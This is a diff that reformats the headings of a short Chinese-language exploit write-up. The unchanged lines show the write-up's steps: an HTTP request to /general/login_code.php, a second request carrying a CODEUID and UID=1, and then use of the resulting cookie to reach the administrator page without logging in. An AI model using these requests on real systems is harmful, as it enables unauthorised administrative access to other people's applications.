@@ -1,4 +1,4 @@
-0x00 发送第一个请求包1
+## 0x00 发送第一个请求包
 
 ```
 GET /general/login_code.php HTTP/1.1
@@ -7,7 +7,7 @@ User-Agent: Go-http-client/1.1
 Accept-Encoding: gzip
 ```
 
-0x01 发送第二个请求包
+## 0x01 发送第二个请求包
 
 
 ```
@@ -22,7 +22,7 @@ CODEUID=%7BD384F12E-A758-F44F-8A37-20E2568306A7%7D&UID=1
 
 ```
 
-获取cookie后访问管理员页面 /general/index.php
+## 获取cookie后访问管理员页面 /general/index.php
 ------------
 
 可以利用工具获取cookie
